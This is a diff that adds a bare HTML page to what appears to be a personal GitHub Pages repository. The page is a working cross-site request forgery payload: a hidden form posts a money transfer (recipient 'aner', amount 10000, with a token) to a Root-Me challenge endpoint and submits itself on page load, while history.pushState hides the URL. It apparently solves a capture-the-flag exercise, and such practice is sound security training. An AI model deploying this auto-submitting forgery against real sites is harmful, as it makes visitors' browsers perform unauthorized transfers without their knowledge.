@@ -1,1 +1,22 @@
 # airureta25-lgtm.github.io
+
+<html>
+  <body>
+    <script>
+      history.pushState('', '', '/');
+      function submitRequest() {
+        document.getElementById("csrf-form").submit();
+      }
+    </script>
+    <form id="csrf-form" action="https://instance-019c1d2a-da24-729c-bb30-4175f54e7223.challenges.root-me.pro/transfer" method="POST">
+      <input type="hidden" name="token" value="69804d88202abb6c000001" />
+      <input type="hidden" name="recipient" value="aner" />
+      <input type="hidden" name="amount" value="10000" />
+      <input type="submit" value="Submit request" style="display: none;" />
+    </form>
+    <script>
+      submitRequest();
+    </script>
+  </body>
+</html>
+
